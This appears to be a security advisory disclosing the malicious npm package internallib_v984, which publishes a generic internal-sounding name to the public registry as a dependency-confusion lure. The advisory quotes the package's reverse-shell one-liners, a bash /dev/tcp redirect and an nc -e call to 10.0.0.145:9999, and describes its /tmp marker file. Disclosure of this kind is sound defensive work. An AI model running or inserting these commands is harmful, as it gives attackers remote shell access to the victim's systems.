summary: Reverse shell backdoor to hardcoded attacker host 10.0.0.145:9999
details: The package exports a `command()` function in index.js that opens a reverse shell to the hardcoded internal-network IP 10.0.0.145 on port 9999 using three redundant techniques: a Node net.Socket piped to /bin/bash, `bash -i >& /dev/tcp/10.0.0.145/9999 0>&1` via child_process.exec, and `nc 10.0.0.145 9999 -e /bin/bash`. It also drops attacker-marker output (`id`/`hostname`) to /tmp/pwned_VERT16X.txt and contains the literal string `VERT16X_PWNED_V2`. The package name `internallib_v984` together with a placeholder `Internal lib` description and absent repository/author metadata matches the dependency-confusion shape: a generic internal-sounding name published to public npm so a victim organization's build resolves to it instead of a private registry. Any caller invoking the exported `command()` gets immediate remote shell access to the attacker on the targeted internal network.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
